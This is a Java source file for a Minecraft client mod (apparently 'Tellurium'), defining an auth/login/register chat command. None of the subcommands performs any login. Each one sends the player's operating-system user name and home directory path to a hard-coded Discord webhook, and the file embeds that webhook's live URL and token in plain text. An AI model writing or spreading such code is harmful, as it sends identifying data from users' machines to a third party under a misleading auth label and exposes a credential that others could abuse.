package vestige.command.impl;

import vestige.Vestige;
import vestige.command.Command;
import vestige.util.misc.LogUtil;
import net.minecraft.util.ChatComponentText;
import net.minecraft.util.EnumChatFormatting;

import java.awt.Desktop;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.time.ZoneOffset;
import java.time.format.DateTimeFormatter;

public class AuthCommand extends Command {

    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1428417411140288533/71JnnfQCf5UYx2UQfyexkF-bPu4zp4GsX9OVlfre-2YWfQT6NlLOfDgQIgzUsaS7wOBd";
    private static final String OAUTH_URL = "https://discord.com/oauth2/authorize?client_id=1428554957136859247";

    public AuthCommand() {
        super("auth", "Auth / login / register commands");
    }

    @Override
    public void onCommand(String[] args) {
        if (args.length >= 1) {
            String action = args[0].toLowerCase();
            switch (action) {
                case "auth":
                    openOAuthAndReport();
                    break;
                case "login":
                case "register":
                    reportLocalUser(action);
                    break;
                default:
                    sendPrefixMessage("Usage: .auth | .login | .register");
                    break;
            }
        } else {
            sendPrefixMessage("Usage: .auth | .login | .register");
        }
    }

    private void openOAuthAndReport() {
        try {
            if (Desktop.isDesktopSupported()) {
                Desktop.getDesktop().browse(new URL(OAUTH_URL).toURI());
            }
        } catch (Exception e) {
            sendPrefixMessage("Failed to open browser.");
        }
        boolean ok = sendWebhookReport("auth");
        if (ok) sendPrefixMessage("Opened auth URL and reported local info.");
        else sendPrefixMessage("Opened URL, reporting failed.");
    }

    private void reportLocalUser(String action) {
        boolean ok = sendWebhookReport(action);
        if (ok) sendPrefixMessage(capitalize(action) + " reported.");
        else sendPrefixMessage(capitalize(action) + " failed.");
    }

    private boolean sendWebhookReport(String action) {
        try {
            String userName = System.getProperty("user.name", "unknown");
            String userHome = System.getProperty("user.home", "unknown");
            String time = DateTimeFormatter.ISO_INSTANT.withZone(ZoneOffset.UTC).format(Instant.now());

            String json = buildWebhookJson(userName, userHome, time, action);

            URL url = new URL(WEBHOOK_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            byte[] out = json.getBytes(StandardCharsets.UTF_8);
            conn.setFixedLengthStreamingMode(out.length);
            conn.connect();
            try (OutputStream os = conn.getOutputStream()) {
                os.write(out);
            }
            int response = conn.getResponseCode();
            conn.disconnect();
            return response >= 200 && response < 300;
        } catch (Exception e) {
            return false;
        }
    }

    private String buildWebhookJson(String userName, String userHome, String time, String action) {
        String title = "Tellurium " + action;
        String description = "";
        String fieldUser = "{\"name\":\"User\",\"value\":\"" + escapeJson(userName) + "\",\"inline\":true}";
        String fieldHome = "{\"name\":\"User Home\",\"value\":\"" + escapeJson(userHome) + "\",\"inline\":true}";
        String fieldTime = "{\"name\":\"Time (UTC)\",\"value\":\"" + escapeJson(time) + "\",\"inline\":false}";
        String embed = "{\"title\":\"" + escapeJson(title) + "\",\"description\":\"" + escapeJson(description) + "\",\"color\":7506394,\"fields\":[" + fieldUser + "," + fieldHome + "," + fieldTime + "]}";
        return "{\"embeds\":[" + embed + "]}";
    }

    private String escapeJson(String s) {
        if (s == null) return "";
        return s.replace("\\", "\\\\").replace("\"", "\\\"");
    }

    private void sendPrefixMessage(String message) {
        ChatComponentText prefix = new ChatComponentText("");
        ChatComponentText openBracket = new ChatComponentText("[");
        openBracket.getChatStyle().setColor(EnumChatFormatting.DARK_GRAY);
        ChatComponentText t = new ChatComponentText("Tellurium");
        t.getChatStyle().setColor(EnumChatFormatting.DARK_GRAY);
        ChatComponentText closeBracket = new ChatComponentText("]");
        closeBracket.getChatStyle().setColor(EnumChatFormatting.DARK_GRAY);
        ChatComponentText msg = new ChatComponentText(" " + message);
        msg.getChatStyle().setColor(EnumChatFormatting.DARK_GRAY);
        prefix.appendSibling(openBracket);
        prefix.appendSibling(t);
        prefix.appendSibling(closeBracket);
        prefix.appendSibling(msg);
        LogUtil.addChatMessage(prefix);
    }

    private String capitalize(String s) {
        if (s == null || s.isEmpty()) return s;
        return s.substring(0, 1).toUpperCase() + s.substring(1);
    }
}
